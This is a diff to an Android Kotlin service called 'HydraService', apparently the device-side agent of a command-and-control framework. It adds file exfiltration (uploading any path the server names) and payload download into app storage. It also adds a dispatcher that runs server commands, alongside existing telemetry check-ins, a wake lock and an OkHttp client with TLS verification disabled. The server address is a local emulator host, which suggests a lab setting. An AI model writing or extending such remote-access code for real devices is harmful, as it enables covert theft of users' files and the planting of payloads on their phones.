@@ -13,10 +13,15 @@ import android.net.wifi.WifiManager
 import android.os.*
 import android.telephony.TelephonyManager
 import android.util.Log
+import android.widget.Toast
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
+import java.io.File
+import java.io.FileOutputStream
 import java.io.IOException
 import java.security.SecureRandom
 import java.security.cert.X509Certificate
@@ -24,10 +29,12 @@ import javax.net.ssl.*
 
 class HydraService : Service() {
     private val TAG = "Hydra"
+    private val DEBUG_TAG = "Hydra-DEBUG"
     private val client = unsafeOkHttpClient()
     private val handler = Handler(Looper.getMainLooper())
     private val heartbeatInterval = 60000L
     private var wakeLock: PowerManager.WakeLock? = null
+    private val serverBaseUrl = "https://10.0.2.2:8443"
 
     private val checkInRunnable = object : Runnable {
         override fun run() {
@@ -68,7 +75,6 @@ class HydraService : Service() {
         startForeground(1, notification)
     }
 
-    // --- Added: Telemetry Methods ---
     private fun getNetworkName(): String {
         return try {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -86,9 +92,7 @@ class HydraService : Service() {
             } else {
                 "Unknown Transport"
             }
-        } catch (e: Exception) {
-            "Network Error"
-        }
+        } catch (e: Exception) { "Network Error" }
     }
 
     private fun getBatteryLevel(): String {
@@ -98,10 +102,70 @@ class HydraService : Service() {
         return if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
     }
 
+    // --- EXFILTRATION (UPLOAD) ---
+    fun uploadFile(filePath: String, clientId: String, serverUrl: String) {
+        val file = File(filePath)
+        if (!file.exists()) {
+            Log.e(TAG, "[-] File does not exist: $filePath")
+            return
+        }
+
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
+            .build()
+
+        val request = Request.Builder()
+            .url("$serverUrl/upload/$clientId")
+            .post(requestBody)
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "[-] Upload Failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.i(TAG, "[+] Upload Successful: ${file.name}")
+                response.close()
+            }
+        })
+    }
+
+    // --- INFILTRATION (DOWNLOAD) ---
+    fun downloadFile(filename: String, serverUrl: String, context: Context) {
+        val request = Request.Builder()
+            .url("$serverUrl/download/$filename")
+            .get()
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "[-] Download Failed: ${e.message}")
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    val body = response.body
+                    if (body != null) {
+                        try {
+                            val destinationFile = File(context.filesDir, filename)
+                            val outputStream = FileOutputStream(destinationFile)
+                            outputStream.write(body.bytes())
+                            outputStream.close()
+                            Log.i(TAG, "[+] Downloaded and saved to: ${destinationFile.absolutePath}")
+                        } catch (e: Exception) {
+                            Log.e(TAG, "[-] Error saving file: ${e.message}")
+                        }
+                    }
+                }
+                response.close()
+            }
+        })
+    }
+
     private fun performCheckIn() {
-        val url = "https://10.0.2.2:8443/checkin/ANDROID-HEAD-01?platform=android"
+        val url = "$serverBaseUrl/checkin/ANDROID-HEAD-01?platform=android"
         
-        // Build the Telemetry JSON
         val telemetry = JSONObject()
         telemetry.put("hostname", "${Build.MANUFACTURER} ${Build.MODEL}")
         telemetry.put("os_version", "Android ${Build.VERSION.RELEASE}")
@@ -129,28 +193,45 @@ class HydraService : Service() {
 
     private fun parseCommand(jsonData: String) {
         try {
+            // CRITICAL: Log this to verify server output in your terminal via 'adb logcat'
+            Log.i(DEBUG_TAG, "RAW JSON RECEIVED: $jsonData")
+
             val json = JSONObject(jsonData)
             if (json.has("command") && !json.isNull("command")) {
                 val cmd = json.getJSONObject("command")
                 val action = cmd.getString("action")
-                Log.i(TAG, "[!] Received Command: $action")
+                val data = cmd.optJSONObject("data") ?: JSONObject()
 
-                if (action == "vibrate") {
-                    // Using optLong from your original code
-                    val duration = cmd.optLong("duration", 1000L) 
-                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-                    
-                    Log.i(TAG, ">> [ACTION] Executing Command: Vibrate ($duration ms)")
+                Log.i(TAG, "[!] Action detected: $action")
 
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
-                    } else {
-                        @Suppress("DEPRECATION")
-                        vibrator.vibrate(duration)
+                when (action) {
+                    "download" -> {
+                        val filename = data.optString("filename", "payload.bin")
+                        downloadFile(filename, serverBaseUrl, this)
+                    }
+                    "upload" -> {
+                        val path = data.optString("path", "")
+                        if (path.isNotEmpty()) uploadFile(path, "ANDROID-HEAD-01", serverBaseUrl)
+                    }
+                    "vibrate" -> {
+                        val duration = data.optLong("duration", 1000L)
+                        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
+                        } else {
+                            @Suppress("DEPRECATION")
+                            vibrator.vibrate(duration)
+                        }
+                    }
+                    "msg" -> {
+                        val content = data.optString("content", "Hello from Server")
+                        handler.post {
+                            Toast.makeText(applicationContext, content, Toast.LENGTH_LONG).show()
+                        }
                     }
                 }
             } else {
-                Log.d(TAG, "No pending command in this heartbeat.")
+                Log.d(TAG, "No pending command.")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error parsing command: ${e.message}")
